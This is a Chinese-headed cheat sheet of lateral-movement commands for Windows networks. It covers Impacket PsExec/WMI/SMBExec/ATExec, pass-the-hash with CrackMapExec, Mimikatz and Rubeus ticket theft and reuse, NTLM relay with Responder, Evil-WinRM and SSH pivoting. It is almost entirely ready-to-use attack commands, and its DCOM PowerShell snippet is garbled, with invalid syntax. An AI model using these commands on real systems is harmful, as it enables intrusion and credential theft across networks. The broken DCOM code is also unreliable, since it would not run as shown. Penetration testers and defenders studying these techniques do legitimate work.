# 横向移动

## 1. PsExec

### Impacket

```bash
psexec.py domain/user:password@target_ip
psexec.py -hashes LMHASH:NTHASH user@target_ip
```

### Metasploit

```bash
use exploit/windows/smb/psexec
set RHOSTS target_ip
set SMBUser admin
set SMBPass password
```

---

## 2. WMI

### Impacket

```bash
wmiexec.py domain/user:password@target_ip
```

### PowerShell

```powershell
Get-WmiObject -Class Win32_Process -ComputerName target_ip
Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName target_ip
```

---

## 3. Pass-the-Hash

### Impacket

```bash
psexec.py -hashes LMHASH:NTHASH user@target_ip
wmiexec.py -hashes LMHASH:NTHASH user@target_ip
```

### CrackMapExec

```bash
crackmapexec smb target_ip -u admin -H NTHASH
```

---

## 4. Pass-the-Ticket

### Mimikatz

```bash
privilege::debug
sekurlsa::tickets /export
kerberos::ppt ticket.kirbi
```

### Rubeus

```bash
Rubeus.exe dump
Rubeus.exe ptt /ticket:ticket.kirbi
```

---

## 5. NTLM Relay

### Impacket

```bash
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -t smb://target_ip -c 'whoami'
```

### Responder

```bash
responder -I eth0
```

---

## 6. WinRM

### Evil-WinRM

```bash
evil-winrm -i target_ip -u user -p password
evil-winrm -i target_ip -u user -H NTHASH
```

### CrackMapExec

```bash
crackmapexec winrm target_ip -u admin -p password -x "whoami"
```

---

## 7. DCOM

### PowerShell

```powershell
$dcom = [System.Management.Automation.AutomationType]::GetType("System.Management.Automation, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35")->GetMethod("CreateInstance", [System.Reflection.BindingFlags]"Public,Static,IgnoreCase", $null, @([System.Type]::GetType("System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089")), $null)
$obj = $dcom.Invoke($null, "MMC20.Application", "TargetComputer")
```

---

## 8. SMBExec

### Impacket

```bash
smbexec.py domain/user:password@target_ip
```

---

## 9. ATExec

### Impacket

```bash
atexec.py domain/user:password@target_ip "command"
```

---

## 10. SSH横向

### 密钥利用

```bash
ssh -i id_rsa user@target_ip
```

### 端口转发

```bash
ssh -L 8080:target2:80 user@jump_host
```
